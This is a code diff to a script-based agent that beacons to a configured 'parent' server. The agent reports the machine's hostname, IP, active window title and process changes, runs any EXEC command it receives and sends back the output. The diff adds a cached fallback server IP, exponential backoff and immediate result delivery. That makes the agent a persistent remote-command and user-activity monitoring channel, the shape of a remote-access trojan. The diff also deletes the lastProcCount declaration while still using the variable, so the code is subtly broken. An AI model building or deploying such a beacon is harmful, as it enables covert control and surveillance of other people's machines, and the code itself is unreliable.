@@ -53,6 +53,30 @@ end
 
 let localIp = getLocalIp()
 
+# ─── Dynamic IP Cache ──────────────────────────────────────────────────────────
+# Saves the last working Parent IP so we can try it first if PARENT_HOST changes.
+let LAST_IP_FILE = ".last_parent_ip"
+let parentHosts = [constants.PARENT_HOST]
+try
+    if file.isFile(LAST_IP_FILE)
+        let saved = file.read(LAST_IP_FILE).strip()
+        if saved != "" and saved != constants.PARENT_HOST
+            parentHosts = [saved, constants.PARENT_HOST]
+        end
+    end
+catch e end
+
+# ─── Exponential Backoff State ─────────────────────────────────────────────────
+let failCount     = 0
+let BASE_INTERVAL = constants.CHECKIN_INTERVAL_SECONDS
+
+fn getWaitTime()
+    if failCount == 0  return 0.5 end
+    if failCount <= 3  return 1.0 end
+    if failCount <= 10 return 5.0 end
+    return 30.0
+end
+
 # 2. Main Agent Connection & Command Execution Loop
 let pendingResult = Null
 let pendingResultCmdId = Null
@@ -61,96 +85,120 @@ let shouldExit = False
 # Smart Sync State
 let lastActiveWindow = ""
 let lastProcCheck = 0.0
-let lastProcCount = -1
+let lastWinCheck = 0.0
 
 while True
+    let connected = False
+    let receivedExec = False
+
     try
-        let client = new net.tcpClient()
-        let ok = client.connect(constants.PARENT_HOST, constants.PARENT_PORT)
-        if ok
-            # --- Smart Sync Checks ---
-            # 1. Active Window Check (Fast ~40ms)
-            let currWin = router.dispatch("ACTIVE_WINDOW")
-            if currWin.startsWith("ACTIVE_WINDOW:")
-                currWin = currWin.slice(14).strip()
-            end
-            
-            # 2. Process Check (Every 5 seconds)
-            let nowTs = datetime.now().timestamp()
-            let procsChanged = False
-            if nowTs - lastProcCheck >= 5.0
-                lastProcCheck = nowTs
-                let pList = router.dispatch("PROCESSES")
-                let pCount = pList.split("\n").length()
-                if lastProcCount != -1 and pCount != lastProcCount
-                    procsChanged = True
+        # Try each known parent host (last working first, then default)
+        for parentHost in parentHosts
+            let client = new net.tcpClient()
+            let ok = client.connect(parentHost, constants.PARENT_PORT)
+            if ok
+                connected = True
+                # Save this working IP for next time
+                try file.write(LAST_IP_FILE, parentHost) catch e end
+                # Keep it first in the list next iteration
+                if parentHosts[0] != parentHost
+                    parentHosts = [parentHost, parentHosts[0]]
                 end
-                lastProcCount = pCount
-            end
 
-            # Build check-in registration payload
-            let req = {
-                "secret":   constants.SECRET_KEY,
-                "id":       deviceId,
-                "hostname": hostname,
-                "ip":       localIp,
-                "active_window": currWin
-            }
-            if procsChanged
-                req["processes_changed"] = True
-            end
+                let nowTs = datetime.now().timestamp()
 
-            let sentCmdId = Null
-            if !isNull(pendingResult)
-                req["result_cmd_id"] = pendingResultCmdId
-                req["result"] = pendingResult
-                sentCmdId = pendingResultCmdId
-            end
-
-            # Send payload to Parent
-            client.send(json.encode(req))
-            client.shutdown(net.SD_SEND)
-
-            # Receive instructions from Parent
-            let respRaw = client.receiveAll()
-            client.close()
-
-            # Successfully communicated with parent! We can clear pendingResult now.
-            if !isNull(sentCmdId) and pendingResultCmdId == sentCmdId
-                pendingResult = Null
-                pendingResultCmdId = Null
-            end
-
-            if shouldExit
-                process.exit(0)
-            end
-
-            if !isNull(respRaw) and respRaw != ""
-                let resp = json.decode(respRaw)
-                if type(resp) == "Map" and resp.has("action") and resp["action"] == "EXEC"
-                    let cmd = resp["command"]
-                    let cmdId = resp["cmd_id"]
-
-                    # Execute command locally via router
-                    let output = router.dispatch(cmd)
-                    pendingResult = output
-                    pendingResultCmdId = cmdId
-
-                    if cmd == "EXIT"
-                        shouldExit = True
+                # --- Smart Sync Checks ---
+                # Check active window every 2.5 seconds (running .exe is slow)
+                if nowTs - lastWinCheck >= 2.5
+                    lastWinCheck = nowTs
+                    let currWin = router.dispatch("ACTIVE_WINDOW")
+                    if currWin.startsWith("ACTIVE_WINDOW:")
+                        currWin = currWin.slice(14).strip()
                     end
-
-                    # Immediately loop to deliver result without waiting
-                    continue
+                    lastActiveWindow = currWin
                 end
+
+                # Check process count every 5.0 seconds
+                let procsChanged = False
+                if nowTs - lastProcCheck >= 5.0
+                    lastProcCheck = nowTs
+                    let pList = router.dispatch("PROCESSES")
+                    let pCount = pList.split("\n").length()
+                    if lastProcCount != -1 and pCount != lastProcCount
+                        procsChanged = True
+                    end
+                    lastProcCount = pCount
+                end
+
+                let req = {
+                    "secret":   constants.SECRET_KEY,
+                    "id":       deviceId,
+                    "hostname": hostname,
+                    "ip":       localIp,
+                    "active_window": lastActiveWindow
+                }
+                if procsChanged
+                    req["processes_changed"] = True
+                end
+
+                let sentCmdId = Null
+                if !isNull(pendingResult)
+                    req["result_cmd_id"] = pendingResultCmdId
+                    req["result"] = pendingResult
+                    sentCmdId = pendingResultCmdId
+                end
+
+                client.send(json.encode(req))
+                client.shutdown(net.SD_SEND)
+
+                let respRaw = client.receiveAll()
+                client.close()
+
+                if !isNull(sentCmdId) and pendingResultCmdId == sentCmdId
+                    pendingResult = Null
+                    pendingResultCmdId = Null
+                end
+
+                if shouldExit
+                    process.exit(0)
+                end
+
+                if !isNull(respRaw) and respRaw != ""
+                    let resp = json.decode(respRaw)
+                    if type(resp) == "Map" and resp.has("action") and resp["action"] == "EXEC"
+                        let cmd = resp["command"]
+                        let cmdId = resp["cmd_id"]
+                        let output = router.dispatch(cmd)
+                        pendingResult = output
+                        pendingResultCmdId = cmdId
+                        if cmd == "EXIT"
+                            shouldExit = True
+                        end
+                        # Set flag to skip sleep and instantly deliver result
+                        receivedExec = True
+                    end
+                end
+
+                # Success — reset backoff
+                failCount = 0
+                break # Break out of the inner parentHosts loop!
             end
+            try client.close() catch e end
         end
     catch e
         if shouldExit
             process.exit(0)
         end
-        # Silently handle connection retries
     end
 
-    process.sleep(constants.CHECKIN_INTERVAL_SECONDS)
+    if !connected
+        failCount += 1
+    end
+
+    # If we received a command, skip sleeping so we can send the result immediately
+    if receivedExec
+        continue
+    end
+
+    process.sleep(getWaitTime())
 end
